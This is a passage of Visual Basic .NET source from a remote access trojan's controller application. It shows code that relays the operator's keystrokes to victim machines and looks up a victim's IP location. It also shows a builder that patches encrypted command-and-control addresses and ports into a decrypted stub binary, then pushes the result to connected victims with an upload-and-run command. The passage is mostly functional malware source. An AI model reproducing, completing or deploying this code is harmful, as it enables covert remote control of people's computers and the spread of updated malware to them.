                            ElseIf e.KeyCode = &H64 Then
                                'Key = "[Num ←]"
                            ElseIf e.KeyCode = &H65 Then
                                Key = ""
                            ElseIf e.KeyCode = &H66 Then
                                ' Key = "[Num →]"
                            ElseIf e.KeyCode = &H67 Then
                                Key = "{HOME}"
                            ElseIf e.KeyCode = &H68 Then
                                ' Key = "[Num ↑]"
                            ElseIf e.KeyCode = &H69 Then
                                Key = "{PGUP}"
                            End If
                        End If

                    Case &H70 To &H87
                        Key = "{F" & (e.KeyCode - 111) & "}"
                    Case &H27
                        Key = "{RIGHT}"
                    Case &H28
                        Key = "{DOWN}"
                    Case &H25
                        Key = "{LEFT}"
                    Case &H26
                        Key = "{UP}"
                    Case &H8
                        Key = "{BS}"
                    Case 190
                        If My.Computer.Keyboard.ShiftKeyDown Then
                            Key = ">"
                        Else
                            Key = "."
                        End If

                    Case 189, &H6D
                        If My.Computer.Keyboard.ShiftKeyDown Then
                            Key = "_"
                        Else
                            Key = "-"
                        End If

                    Case 188
                        If My.Computer.Keyboard.ShiftKeyDown Then
                            Key = "<"
                        Else
                            Key = ","
                        End If

                    Case 191
                        If My.Computer.Keyboard.ShiftKeyDown Then
                            Key = "?"
                        Else
                            Key = "/"
                        End If

                    Case 186
                        If My.Computer.Keyboard.ShiftKeyDown Then
                            Key = ":"
                        Else
                            Key = ";"
                        End If

                    Case 222
                        If My.Computer.Keyboard.ShiftKeyDown Then
                            Key = """"
                        Else
                            Key = "'"
                        End If

                    Case 220
                        If My.Computer.Keyboard.ShiftKeyDown Then
                            Key = "|"
                        Else
                            Key = "\"
                        End If

                    Case 219
                        If My.Computer.Keyboard.ShiftKeyDown Then
                            Key = "{"
                        Else
                            Key = "["
                        End If

                    Case 221
                        If My.Computer.Keyboard.ShiftKeyDown Then
                            Key = "}"
                        Else
                            Key = "]"
                        End If

                    Case 192
                        If My.Computer.Keyboard.ShiftKeyDown Then
                            Key = "~"
                        Else
                            Key = "`"
                        End If

                    Case 187
                        If My.Computer.Keyboard.ShiftKeyDown Then
                            Key = "+"
                        Else
                            Key = "="
                        End If

                    Case 226
                        Key = "\"
                    Case 35
                        Key = "{END}"
                    Case 34
                        Key = "{PGUP}"
                    Case 33
                        Key = "{PGDN}"
                    Case 36
                        Key = "{HOME}"
                    Case 45
                        Key = "{INS}"
                    Case 145
                        Key = "{SCROLLLOCK}"
                    Case 19
                        Key = "{BREAK}"
                    Case 144
                        Key = "{NUMLOCK}"
                    Case 111
                        Key = "/"
                    Case 106
                        Key = "*"
                    Case 107
                        Key = "+"
                    Case 91

                    Case 92

                    Case 93

                    Case &H6E
                        If My.Computer.Keyboard.NumLock Then
                            Key = "."
                        Else
                            Key = "{DEL}"
                        End If
                    Case 12
                        Key = ""
                    Case 44
                        Key = "{PRTSC}"

                    Case 3
                        Key = "{BREAK}"

                    Case Else

                End Select
                If Not Key = Nothing Then
                    streamWriterlist(abc).WriteLine("/SENDKEYB/" & Key)
                    streamWriterlist(abc).Flush()
                End If
            End If
        Catch ex As Exception

        End Try
        
    End Sub


    Private Sub TextBox29_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox29.TextChanged
        TextBox29.Text = Nothing
    End Sub

    Private Sub FindCountryToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FindCountryToolStripMenuItem.Click
        Try
            Process.Start("http://geotool.flagfox.net/?ip=" & objListViewItem1.Text)
        Catch ex As Exception

        End Try

    End Sub

    Private Sub Button88_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button88.Click
        Try
            If TextBox14.Text = Nothing Or TextBox17.Text = Nothing Or TextBox19.Text = Nothing Then
                MessageBox.Show("Please fill new RAT settings such as RAT filename, at least one IP(DNS) and at least one port", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
                Exit Sub
            End If
            CheckBox2.Checked = False
            patch = TextBox14.Text

            Dim ad As String = IIf(CheckBox3.Checked, "1", "0")
            Dim test As String = Encrypt(TextBox17.Text & "*" & TextBox21.Text & "*" & TextBox19.Text & "*" & TextBox26.Text & "*" & ad, "&%#@?,:*")
            If test.Length < 150 Then
                For i As Integer = 0 To (149 - test.Length)
                    test = test & "*"
                Next
            End If
            Dim fffs As String = My.Computer.FileSystem.ReadAllText(Application.StartupPath & "\" & "ST.obj")
            Dim fff() As Byte = Convert.FromBase64String(Decrypt(fffs, "&%#@?,:*"))
            My.Computer.FileSystem.WriteAllBytes(Application.StartupPath & "\" & patch, fff, False)
            Try
                Dim TPath As String = Application.StartupPath & "\"
                Dim file1, filez() As String
                FileOpen(1, TPath & TextBox14.Text, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
                file1 = Space(LOF(1))
                FileGet(1, file1)
                FileClose(1)
                filez = Split(file1, FileS)
                FileOpen(3, TPath & "1.obj", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                FilePut(3, filez(0))
                FileClose(3)
                FileOpen(4, TPath & "3.obj", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                FilePut(4, test)
                FileClose(4)
                FileOpen(5, TPath & "2.obj", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                FilePut(5, filez(1))
                FileClose(5)

                Dim b1() As Byte = My.Computer.FileSystem.ReadAllBytes(TPath & "1.obj")
                Dim b2() As Byte = My.Computer.FileSystem.ReadAllBytes(TPath & "2.obj")
                Dim b3() As Byte = My.Computer.FileSystem.ReadAllBytes(TPath & "3.obj")
                My.Computer.FileSystem.WriteAllBytes(TPath & TextBox14.Text, b1, False)
                My.Computer.FileSystem.WriteAllBytes(TPath & TextBox14.Text, b3, True)
                My.Computer.FileSystem.WriteAllBytes(TPath & TextBox14.Text, b2, True)
                My.Computer.FileSystem.DeleteFile(TPath & "1.obj")
                My.Computer.FileSystem.DeleteFile(TPath & "2.obj")
                My.Computer.FileSystem.DeleteFile(TPath & "3.obj")
            Catch ex As Exception

            End Try
            Dim str As String = Nothing
            Dim bmpBytes() As Byte = My.Computer.FileSystem.ReadAllBytes(Application.StartupPath & "\" & TextBox14.Text)
            str = Convert.ToBase64String(bmpBytes)
            Dim pathup As String = TextBox14.Text
            For i As Integer = 0 To clientList.Count - 1
                Try
                    If ListView1.Items.Item(i).SubItems(4).Text.Contains("1.7") AndAlso ListView1.Items.Item(i).SubItems(4).Text <> "1.7G" Then
                        Dim ns As NetworkStream = New NetworkStream(clientList(i))
                        Dim ss As StreamWriter = New StreamWriter(ns)
                        ss.WriteLine("/UPANDRUN/" & "C:\Users\Public\" & "*" & pathup & "*" & str & "*" & "1")
                        ss.Flush()
                    
                    End If

                Catch ex As Exception

                End Try

            Next
            str = Nothing

        Catch exi As Exception
        End Try
    End Sub

  
End Class

